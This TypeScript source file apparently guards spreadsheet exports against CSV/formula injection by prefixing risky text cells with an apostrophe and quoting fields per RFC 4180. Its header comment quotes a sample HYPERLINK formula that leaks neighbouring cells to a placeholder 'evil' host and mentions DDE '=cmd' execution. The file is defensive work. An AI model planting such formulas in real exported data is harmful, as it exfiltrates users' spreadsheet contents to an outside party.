/**
 * Spreadsheet ("CSV/formula") injection guard.
 *
 * Excel, LibreOffice and Google Sheets treat a cell whose text starts with
 * `=`, `+`, `-` or `@` as a formula — `=HYPERLINK("https://evil/?"&A2,"Bấm")` in
 * an article title becomes a live link that leaks neighbouring cells, and older
 * Excel even ran `=cmd|…` (DDE). A leading tab, carriage return or line feed is
 * stripped by some importers, after which the next character is read as the
 * formula start.
 *
 * The standard neutraliser (OWASP "CSV Injection") is a leading apostrophe: the cell
 * is read as TEXT, never evaluated. Google Sheets (USER_ENTERED) hides the
 * apostrophe; Excel opening a CSV file may show it literally — a visible `'` on the
 * rare title that starts with one of these characters is the accepted cost.
 * Numbers pass through untouched — only text from the database (titles, names,
 * slugs) can carry a formula.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r\n]/

export function neutralizeSpreadsheetText(value: string): string {
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value
}

/**
 * One CSV field: text is neutralised (see above), then quoted when it contains
 * `,` `"` CR or LF, with `"` doubled (RFC 4180). Numbers are written as-is — a
 * negative number is data, not a formula, and only text can come from a user.
 */
export function csvCell(value: unknown): string {
  const s = typeof value === 'number' ? String(value) : neutralizeSpreadsheetText(String(value ?? ''))
  return /[",\r\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s
}
